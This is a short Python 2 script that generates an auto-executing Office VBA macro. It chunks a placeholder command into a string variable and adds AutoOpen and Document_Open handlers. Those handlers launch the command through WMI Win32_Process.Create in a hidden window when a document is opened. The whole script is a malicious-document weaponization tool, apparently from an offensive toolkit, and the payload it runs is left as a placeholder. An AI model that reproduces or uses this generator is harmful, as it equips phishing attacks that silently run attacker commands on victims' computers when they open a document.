import os, sys
import re

holder = []
str1 = ''
str2 = ''

varstr="str"
instr="[MACRO HERE]"

for i in xrange(0, len(instr), 48):
    holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
    str2 = '"\r\n'.join(holder)

header = """Sub AutoOpen()
        Debugging
End Sub

Sub Document_Open()
        Debugging
End Sub

Public Function Debugging() As Variant
        Dim Str As String"""

footer="""
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create Str, Null, objConfig, intProcessID
End Function"""

print header
str2 = str2 + "\""
str1 = str1 + "\r\n"+str2
print str1
print footer